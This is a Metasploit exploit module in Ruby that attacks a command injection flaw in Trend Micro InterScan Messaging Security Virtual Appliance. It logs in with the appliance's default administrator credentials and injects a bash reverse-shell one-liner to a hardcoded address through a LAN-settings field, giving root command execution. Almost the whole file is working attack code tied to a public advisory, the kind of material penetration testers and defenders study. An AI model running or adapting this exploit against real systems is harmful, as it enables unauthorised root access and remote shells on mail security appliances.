##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution',
      'Description'    => %q{
        This module exploits a command injection vulnerability in the Trend Micro
        IMSVA product. An authenticated user can execute a terminal command under
        the context of the web server user which is root. Besides, default installation
        of IMSVA comes with a default administrator credentials.

        WizardSetting_sys.imss endpoint takes several user inputs and performs LAN settings.
        After that it use them as argument of predefined operating system command
        without proper sanitation. It's possible to inject arbitrary commands into it.

        InterScan Messaging Security prior to 9.1.-1600 affected by this issue.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Cody Sixteen <610code\at\gmail.com>', # found bug, rewrite poc
          'Mehmet Ince <mehmet\at\mehmetince.net>' # msf module based on pentest.blog
        ],
      'References'     =>
        [
          ['CVE', '2017-not-yet'],
          ['URL', 'https://code610.blogspot.com/2017/08/rce-in-trend-micro-imsva-91.html'],
          ['URL', 'https://pentest.blog/advisory-trend-micro-interscan-messaging-security-virtual-appliance-remote-code-execution/']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'BadChars'    => "\x2f\x22"
        },
      'DefaultOptions' =>
        {
          'SSL' => true,
          'payload' => 'python/meterpreter/reverse_tcp',
        },
      'Platform'       => [''],
      'Arch'           => ARCH_PYTHON,
      'Targets'        => [ ['Automatic', {}] ],
      'DisclosureDate' => 'Aug 18 2017',
      'DefaultTarget'  => 0
       ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The target URI of the Trend Micro IMSVA', '/']),
        OptString.new('USERNAME', [ true, 'The username for authentication', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The password for authentication', 'imsva' ]),
        Opt::RPORT(8445)
      ]
    )
  end

  def login

    user = datastore['USERNAME']
    pass = datastore['PASSWORD']

    print_status("Attempting to login with #{user}:#{pass}")

    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'login.imss'),
      'vars_post' => {
        'userid' => user,
        'pwdfake' => Rex::Text::encode_base64(pass)
      }
    })

    if res && res.body.include?("The user name or password you entered is invalid")
      fail_with(Failure::NoAccess, "#{peer} - Login with #{user}:#{pass} failed...")
    end

    cookie = res.get_cookies
    if res.code == 302 && cookie.include?("JSESSIONID")
      jsessionid = cookie.scan(/JSESSIONID=(\w+);/).flatten.first
      print_good("Authenticated as #{user}:#{pass}")
      return jsessionid
    end

    nil
  end

  def exploit

    jsessionid = login

    unless jsessionid
      fail_with(Failure::Unknown, 'Unable to obtain the cookie session ID')
    end

    # Somehow java stores last visited url on session like viewstate!
    # Visit form before submitting it. Otherwise, it will cause a crash.

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'WizardSetting_sys.imss?direct=next'),
      'cookie' => "JSESSIONID=#{jsessionid}"
    })

    if !res
      fail_with(Failure::Unknown, 'Unable to visit WizardSetting_sys.imss')
    end

    print_status("Delivering payload...")

    # payload ; thanks goes to: bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
    # remember to set your listening nc in 2nd window
    cmd = "eth0'; 0<&196;exec 196<>/dev/tcp/192.168.56.106/9999;sh <&196 >&196 2>&196 ;#"

    # print_status("payload: #{cmd}") ;]
    payl = cmd.encode

    # go.
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'WizardSetting_sys.imss'),
      'cookie' => "JSESSIONID=#{jsessionid}",
      'vars_get' => {
          'direct' => 'next'
      },
      'vars_post' => {
          'time_distance' => '0',
          'sys_ipv4_addr_eth0' => '192.168.56.34',
          'sys_ipv4_mask_eth0' => '255.255.255.0',
          'sys_desname' => "#{cmd}",
          'sys_hostname' => 'trend.me',
          'sys_ipv4_gateway' => '192.168.56.1',
          'sys_ipv4_pri_dns' => '192.168.56.1',
          'sys_ipv4_sec_dns' => '',
          'sys_tz_cont' => 'America',
          'sys_tz_regn' => 'United+States',
          'sys_tz_city' => 'New_York',
      }
    })
    print_status("Payload finished.")
  end

end
